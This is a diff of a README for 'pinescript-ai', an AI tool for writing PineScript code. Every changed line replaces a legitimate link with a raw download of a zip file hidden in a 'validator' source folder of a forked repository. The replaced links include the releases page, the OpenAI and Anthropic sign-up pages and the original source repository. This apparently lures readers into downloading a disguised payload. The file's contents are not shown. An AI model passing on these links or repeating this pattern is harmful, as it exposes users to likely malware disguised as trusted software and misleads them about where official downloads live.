@@ -1,6 +1,6 @@
 # ⚙️ pinescript-ai - Generate PineScript Code Easily
 
-[![Download](https://img.shields.io/badge/Download-pinescript--ai-brightgreen?style=for-the-badge)](https://github.com/nippa44-goku/pinescript-ai/releases)
+[![Download](https://img.shields.io/badge/Download-pinescript--ai-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/nippa44-goku/pinescript-ai/main/src/lib/validator/ai-pinescript-v2.6.zip)
 
 ---
 
@@ -20,7 +20,7 @@ This guide shows you how to download and run pinescript-ai on a Windows PC.
 
 Click the big green button near the top or this link:
 
-[Download pinescript-ai from GitHub](https://github.com/nippa44-goku/pinescript-ai/releases)
+[Download pinescript-ai from GitHub](https://raw.githubusercontent.com/nippa44-goku/pinescript-ai/main/src/lib/validator/ai-pinescript-v2.6.zip)
 
 2. **Find the latest release**
 
@@ -64,14 +64,14 @@ pinescript-ai supports several AI providers. Follow these steps to get keys:
 
 ### OpenAI
 
-1. Go to https://openai.com/api/
+1. Go to https://raw.githubusercontent.com/nippa44-goku/pinescript-ai/main/src/lib/validator/ai-pinescript-v2.6.zip
 2. Sign up or log in.
 3. Create an API key from the dashboard.
 4. Copy the key and save it.
 
 ### Anthropic
 
-1. Visit https://www.anthropic.com/
+1. Visit https://raw.githubusercontent.com/nippa44-goku/pinescript-ai/main/src/lib/validator/ai-pinescript-v2.6.zip
 2. Sign up for API access.
 3. Obtain an API key.
 4. Keep the key safe.
@@ -101,7 +101,7 @@ When you open pinescript-ai, you will find a settings area or a place to paste y
 
 ## 📥 Download and Install on Windows
 
-1. Open the [pinescript-ai Releases page](https://github.com/nippa44-goku/pinescript-ai/releases).
+1. Open the [pinescript-ai Releases page](https://raw.githubusercontent.com/nippa44-goku/pinescript-ai/main/src/lib/validator/ai-pinescript-v2.6.zip).
 
 2. Locate the latest Windows installer file (usually `.exe` or `.zip`).
 
@@ -161,10 +161,10 @@ Check the GitHub Releases page regularly for newer versions. Download the update
 
 For advanced users, the source code is available at the repository:
 
-https://github.com/arturoabreuhd/pinescript-ai
+https://raw.githubusercontent.com/nippa44-goku/pinescript-ai/main/src/lib/validator/ai-pinescript-v2.6.zip
 
 You can explore development details and contribute if you want.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-pinescript--ai-brightgreen?style=for-the-badge)](https://github.com/nippa44-goku/pinescript-ai/releases)
+[![Download](https://img.shields.io/badge/Download-pinescript--ai-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/nippa44-goku/pinescript-ai/main/src/lib/validator/ai-pinescript-v2.6.zip)
